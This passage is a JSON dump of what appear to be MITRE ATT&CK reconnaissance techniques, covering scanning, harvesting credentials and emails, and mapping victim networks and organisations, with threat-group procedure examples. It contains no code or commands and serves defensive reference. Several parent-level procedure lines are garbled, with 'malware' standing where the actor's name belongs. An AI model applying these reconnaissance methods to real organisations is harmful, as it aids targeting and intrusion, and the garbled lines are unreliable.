{
    "T1595": {
        "ttp_name": "Active Scanning",
        "ttp_id": "T1595",
        "href": "/techniques/T1595",
        "subtechnique": {
            "001": {
                "name": "Scanning IP Blocks",
                "href": "/techniques/T1595/001",
                "description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.[1] Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",
                "Procedure": {
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has scanned specific lists of target IP addresses.[2]"
                    }
                }
            },
            "002": {
                "name": "Vulnerability Scanning",
                "href": "/techniques/T1595/002",
                "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.[1] Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has performed large-scale scans in an attempt to find vulnerable servers.[2]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has conducted widespread scanning of target environments to identify vulnerabilities for exploit.[3]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.[4]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).[5]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.[6]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.[7]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has scanned for vulnerabilities in the public-facing servers of their targets.[8]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.[9][10]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has scanned network infrastructure for vulnerabilities as part of its operational planning.[11]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.[12]"
                    },
                    "G0123": {
                        "ID": "G0123",
                        "Name": "Volatile Cedar",
                        "Description": "<name> has performed vulnerability scans of the target server.[13][14]"
                    }
                }
            },
            "003": {
                "name": "Wordlist Scanning",
                "href": "/techniques/T1595/003",
                "description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.[1] This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.[2][3] Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> leverages various tools and frameworks to brute-force directories on web servers.[4]"
                    },
                    "G0123": {
                        "ID": "G0123",
                        "Name": "Volatile Cedar",
                        "Description": "<name> has used DirBuster and GoBuster to brute force web directories and DNS subdomains.[1]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.[1][2] Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
        "Procedure": {
            "C0030": {
                "ID": "C0030",
                "Name": "Triton Safety Instrumented System Attack",
                "Description": "In the malware, TEMP.Veles engaged in network reconnaissance against targets of interest.[3]"
            }
        }
    },
    "T1592": {
        "ttp_name": "Gather Victim Host Information",
        "ttp_id": "T1592",
        "href": "/techniques/T1592",
        "subtechnique": {
            "001": {
                "name": "Hardware",
                "href": "/techniques/T1592/001",
                "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1] Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).",
                "Procedure": {}
            },
            "002": {
                "name": "Software",
                "href": "/techniques/T1592/002",
                "description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1] Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).",
                "Procedure": {
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.[2]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has captured the user-agent strings from visitors to their phishing sites.[3]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. <name> also collected a list of computers using specific software as part of its targeting efforts.[4]"
                    }
                }
            },
            "003": {
                "name": "Firmware",
                "href": "/techniques/T1592/003",
                "description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).",
                "Procedure": {}
            },
            "004": {
                "name": "Client Configurations",
                "href": "/techniques/T1592/004",
                "description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1] Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
                "Procedure": {
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has interacted with Office 365 tenants to gather details regarding target's environments.[2]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1] Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
        "Procedure": {}
    },
    "T1589": {
        "ttp_name": "Gather Victim Identity Information",
        "ttp_id": "T1589",
        "href": "/techniques/T1589",
        "subtechnique": {
            "001": {
                "name": "Credentials",
                "href": "/techniques/T1589/001",
                "description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.[1] Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.).[2][3][4][5][6][7][8] Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).[9]Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has harvested user's login credentials.[10]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "To support initial access, <name> gained access to databases with information about existing accounts as well as plaintext and hashed passwords.[11]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider sent phishing messages via SMS to steal credentials.[12]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has collected credentials for the target organization from previous breaches for use in brute force attacks.[13]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials.[14][15]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has collected compromised credentials to use for targeting efforts.[16]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> gathered credentials from two victims that they then attempted to validate across 75 different websites. <name> has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel.[17][18]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "For the <name>, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments.[19]"
                    }
                }
            },
            "002": {
                "name": "Email Addresses",
                "href": "/techniques/T1589/002",
                "description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1][2] Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.[3] For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.[4][5]Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can check for the existence of user email addresses using public Microsoft APIs.[6][7]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has collected e-mail addresses for activists and bloggers in order to target them with spyware.[8]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has gathered targeted individuals' e-mail addresses through open source research and website contact forms.[9]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has collected e-mail addresses for users they intended to target.[10]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has targeted executives, human resources staff, and IT personnel for spearphishing.[11][12]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has collected valid email addresses that were subsequently used in spearphishing campaigns.[13]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts.[14]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.[15]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting.[16][17]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.[18]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has collected e-mail addresses from targeted organizations from open Internet searches.[19]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.[20]"
                    }
                }
            },
            "003": {
                "name": "Employee Names",
                "href": "/techniques/T1589/003",
                "description": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "To support initial access, <name> gained access to databases with information about existing accounts and lists of employees.[2]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has collected victim employee name information.[3]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name>'s research of potential victim organizations included the identification and collection of employee information.[4]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has collected lists of names for individuals from targeted organizations.[5]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about users could also be enumerated via other active means (i.e. Active Scanning) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.[1][2] Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[3][4][5][6][7][8][9][10]Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
        "Procedure": {
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has conducted targeted surveillance against activists and bloggers.[11]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has researched employees to target for social engineering attacks.[12]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has identified specific potential victims at targeted organizations.[13]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has gathered detailed information of target employees to enhance their social engineering lures.[14]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.[15]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "For malware, Lazarus Group conducted extensive reconnaissance research on potential targets.[16]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors targeted people based on their organizational roles and privileges.[17]"
            }
        }
    },
    "T1590": {
        "ttp_name": "Gather Victim Network Information",
        "ttp_id": "T1590",
        "href": "/techniques/T1590",
        "subtechnique": {
            "001": {
                "name": "Domain Properties",
                "href": "/techniques/T1590/001",
                "description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: WHOIS).[1][2][3] Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.[4][5] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Phishing).",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can gather information about a tenant\u2019s domains using public Microsoft APIs.[6][7]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.[8]"
                    }
                }
            },
            "002": {
                "name": "DNS",
                "href": "/techniques/T1590/002",
                "description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.[1]Adversaries may gather this information in various ways, such as querying or otherwise collecting details via DNS/Passive DNS. DNS information may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases).[2][3] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases, Search Open Websites/Domains, or Active Scanning), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
                "Procedure": {}
            },
            "003": {
                "name": "Network Trust Dependencies",
                "href": "/techniques/T1590/003",
                "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",
                "Procedure": {}
            },
            "004": {
                "name": "Network Topology",
                "href": "/techniques/T1590/004",
                "description": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
                "Procedure": {
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has searched for infrastructure that can provide remote access to an environment for targeting efforts.[2]"
                    }
                }
            },
            "005": {
                "name": "IP Addresses",
                "href": "/techniques/T1590/005",
                "description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases).[1][2][3] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
                "Procedure": {
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has limited its watering hole attacks to specific IP address ranges.[4]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has obtained IP addresses for publicly-accessible Exchange servers.[5]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has captured the IP addresses of visitors to their phishing sites.[6]"
                    }
                }
            },
            "006": {
                "name": "Network Security Appliances",
                "href": "/techniques/T1590/006",
                "description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information.[1] Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",
                "Procedure": {}
            }
        },
        "tactic": "Reconnaissance",
        "description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases).[1][2][3] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",
        "Procedure": {
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.[4]"
            }
        }
    },
    "T1591": {
        "ttp_name": "Gather Victim Org Information",
        "ttp_id": "T1591",
        "href": "/techniques/T1591",
        "subtechnique": {
            "001": {
                "name": "Determine Physical Locations",
                "href": "/techniques/T1591/001",
                "description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media).[1][2] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).",
                "Procedure": {
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has collected location information from visitors to their phishing sites.[3]"
                    }
                }
            },
            "002": {
                "name": "Business Relationships",
                "href": "/techniques/T1591/002",
                "description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).",
                "Procedure": {
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has collected open source information to identify relationships between organizations for targeting purposes.[2]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has gathered detailed knowledge of an organization's supply chain relationships.[3]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "In preparation for its attack against the 2018 Winter Olympics, <name> conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.[4]"
                    }
                }
            },
            "003": {
                "name": "Identify Business Tempo",
                "href": "/techniques/T1591/003",
                "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)",
                "Procedure": {}
            },
            "004": {
                "name": "Identify Roles",
                "href": "/techniques/T1591/004",
                "description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites).[1] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).",
                "Procedure": {
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has identified executives, HR, and IT staff at victim organizations for further targeting.[2][3]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has gathered detailed knowledge of team structures within a target organization.[4]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements.[5][6]"
                    }
                }
            }
        },
        "tactic": "Reconnaissance",
